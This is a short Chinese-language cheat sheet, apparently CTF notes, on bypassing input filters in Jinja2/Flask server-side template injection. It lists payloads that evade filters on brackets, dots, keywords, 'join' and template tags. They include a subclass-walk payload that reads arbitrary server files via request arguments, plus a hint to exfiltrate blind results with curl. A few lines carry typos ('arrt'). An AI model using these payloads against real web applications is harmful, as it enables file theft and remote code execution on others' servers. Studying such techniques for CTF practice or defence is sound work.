1. 中括号绕过
我们的中括号表示我们在某一个**列表**当中取值。例如我们的 `l[0]`。我们可以采用我们的内置的函数来进行，也就是我们的 `__getitem__` 函数来进行绕过。

```
l[0]=l.__getitem__(0);
```

2. 过滤了点
在 python 中，可用以下表示法可用于访问对象的属性

```
{{().__class__}}
{{()["__class__"]}}
{{()|attr("__class__")}}
{{getattr('',"__class__")}}，这样做就相当于实现了''.__class__
```


3. 关键字过滤：
在我们的某些过滤中，可能会过滤掉我们的 `class` 或者我们的其他关键字，这个时候我们可以通过 request 方法来完成我们的过滤，例如：
```
().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &path=
```

```
request|attr((request.args.usc*2,request.args.class,request.args.usc*2|join))&class=class&&usc=_
```

```
request|arrt(request.args.getlist(request.args.l)|join)     &l=a&a=_&a=_&a=class&a=_&a=_
```

**过滤了 join**, 使用格式化字符串
```
request|arrt(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)   &f=%s%sclass%s%s&a=_
```

4. 过滤模板标签：
```
{% if 无回显的payload，需要用curl带出 %}{% endif%}
```

5. 禁用了 `ls,cat` 等方法：
我们这一题可以通过我们的 `python` 中的 getattribute 方法来实现。
```
l.__getattribute__('__cla''ss__')->l.class
```

或者我们可以采用我们的 hex 编码（**常见**）
